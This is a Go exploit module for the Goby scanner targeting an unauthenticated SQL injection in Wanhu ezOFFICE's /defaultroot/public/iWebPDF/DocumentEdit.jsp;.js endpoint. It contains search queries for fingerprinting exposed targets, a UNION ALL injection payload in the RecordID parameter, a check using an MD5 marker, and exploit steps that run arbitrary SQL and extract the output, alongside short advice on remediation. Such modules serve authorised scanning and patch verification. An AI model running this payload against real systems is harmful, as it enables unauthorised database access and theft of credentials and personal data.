package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Wanhu ezOFFICE /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js SQL Injection Vulnerability",
    "Description": "<p>Wanhu OA ezoffice is a mid-to-high-end OA collaborative office software product launched by Wanhu Network, providing a unified basic management platform to achieve unified management of user data, permission allocation, and identity authentication. This vulnerability exists in the /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js interface, allowing unauthorized attackers to obtain database permissions through SQL injection, which may further lead to server permissions being obtained, resulting in sensitive information leakage and complete system control.</p>",
    "Product": "Wanhu ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2023-02-22",
    "PostTime": "2025-02-06",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information (such as administrator passwords and user personal information) from the database through SQL injection, and may further use high-privilege operations to write malicious files to the server, resulting in the server being completely controlled.</p>",
    "Recommendation": "<p>It is recommended to strictly validate and filter user input to ensure the legality and security of the input data. At the same time, update to the latest patch released by the vendor promptly. For more information, please refer to: <a href=\"http://www.whir.net/cn/ezofficeqyb/index_52.html.\">http://www.whir.net/cn/ezofficeqyb/index_52.html.</a></p>",
    "References": [
        "https://github.com/adysec/nuclei_poc/blob/a30a9e67c9306a5b8c9b4d58b357a7144330cd96/poc/sql/wanhu-ezoffice-iwebpdf-documentedit-sqli.yaml#L17"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/public/iWebPDF/DocumentEdit.jsp;.js",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "RecordID=1' UNION ALL SELECT NULL,CONCAT(0x7e,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','{{{rand_int}}}'))),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/public/iWebPDF/DocumentEdit.jsp;.js",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "RecordID=1' UNION ALL SELECT NULL,CONCAT(0x7e,({{{payload}}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"~([^'][\\s\\S]*?)~\"",
                "output|when|attackType=sqlpoint|{{{lastreq}}}RecordID=1*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "AI"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js SQL 注入漏洞",
            "Product": "万户OA ezoffice",
            "Description": "<p>万户OA ezoffice 是万户网络推出的一款中高端市场的 OA 协同办公软件产品，提供统一的基础管理平台，实现用户数据统一管理、权限分配和身份认证。该漏洞存在于 /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js 接口中，未授权的攻击者可以通过 SQL 注入获取数据库权限，进一步利用可能获取服务器权限，导致敏感信息泄露和系统被完全控制。</p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。&nbsp;2、该厂商发布最新修复版本，关注 <a href=\"http://www.whir.net/cn/ezofficeqyb/index_52.html\">http://www.whir.net/cn/ezofficeqyb/index_52.html</a><br></p>",
            "Impact": "<p>该漏洞允许攻击者通过 SQL 注入获取数据库中的敏感信息（如管理员密码、用户个人信息），并可能进一步利用高权限操作向服务器写入恶意文件，导致服务器被完全控制。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "AI"
            ]
        },
        "EN": {
            "Name": "Wanhu ezOFFICE /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js SQL Injection Vulnerability",
            "Product": "Wanhu ezOFFICE",
            "Description": "<p>Wanhu OA ezoffice is a mid-to-high-end OA collaborative office software product launched by Wanhu Network, providing a unified basic management platform to achieve unified management of user data, permission allocation, and identity authentication. This vulnerability exists in the /defaultroot/public/iWebPDF/DocumentEdit.jsp;.js interface, allowing unauthorized attackers to obtain database permissions through SQL injection, which may further lead to server permissions being obtained, resulting in sensitive information leakage and complete system control.</p>",
            "Recommendation": "<p>It is recommended to strictly validate and filter user input to ensure the legality and security of the input data. At the same time, update to the latest patch released by the vendor promptly. For more information, please refer to: <a href=\"http://www.whir.net/cn/ezofficeqyb/index_52.html.\">http://www.whir.net/cn/ezofficeqyb/index_52.html.</a></p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information (such as administrator passwords and user personal information) from the database through SQL injection, and may further use high-privilege operations to write malicious files to the server, resulting in the server being completely controlled.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "AI"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand_int": "define|variable|{{{rand|int|5}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/defaultroot/public/iWebPDF/DocumentEdit.jsp;.js"
    },
    "VariablesOrder": [
        "payload",
        "rand_int",
        "rand_int_md5",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}